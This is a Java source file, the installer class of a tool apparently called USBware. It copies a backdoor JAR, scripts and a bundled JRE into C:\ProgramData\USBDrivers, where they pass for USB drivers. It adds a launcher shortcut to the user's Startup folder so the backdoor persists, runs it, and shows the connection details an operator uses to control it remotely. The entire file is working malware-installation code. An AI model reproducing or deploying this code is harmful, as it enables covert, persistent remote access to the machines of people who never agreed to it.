package com.github.thatcherdev.usbware.install;

import java.io.File;
import javax.swing.JOptionPane;
import org.apache.commons.io.FileUtils;
import com.github.thatcherdev.usbware.backend.Utils;
import com.github.thatcherdev.usbware.usbware.Setup;
import mslinks.ShellLink;

public class Install {

	/**
	 * Installs backdoor to 'C:\ProgramData\USBDrivers'. Attempts to add backdoor to
	 * startup. Starts backdoor. Displays WiFi and backdoor information.
	 * 
	 * @param args
	 */
	public static void main(String[] args) {
		String disp="";
		try{
			if(new File("jre").isDirectory() && (new File("jre\\bin").isDirectory() && new File("jre\\lib").isDirectory()))
				FileUtils.copyDirectory(new File("resources\\jre"), new File("C:\\ProgramData\\USBDrivers\\jre"));
			FileUtils.copyDirectory(new File("resources\\scripts"), new File("C:\\ProgramData\\USBDrivers\\scripts"));
			FileUtils.copyFile(new File("resources\\backdoor.jar"), new File("C:\\ProgramData\\USBDrivers\\USBDrivers.jar"));
			Setup.createBat("C:\\ProgramData\\USBDrivers\\USBDrivers.bat", "jre", "USBDrivers");
			FileUtils.copyFile(new File("resources\\ip.txt"), new File("C:\\ProgramData\\USBDrivers\\ip.txt"));
			try{
				ShellLink.createLink("C:\\ProgramData\\USBDrivers\\USBDrivers.bat", "C:\\Users\\"+System.getProperty("user.name")
					+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk");
			}catch(Exception e){
				disp+="Could not add backdoor to startup\n\n";
			}
			Utils.runCommand("cmd /c \"\" C:\\ProgramData\\USBDrivers\\USBDrivers.bat");
			disp+="Backdoor running!\n\nTo control backdoor, connect to:\n"+Utils.currentConnection()+"\nand run option 1 in USBware";
		}catch(Exception e){
			disp="An error occurred:\n"+e.getMessage();
		}finally{
			JOptionPane.showMessageDialog(null, disp, "Backdoor control information", JOptionPane.INFORMATION_MESSAGE);
		}
	}
}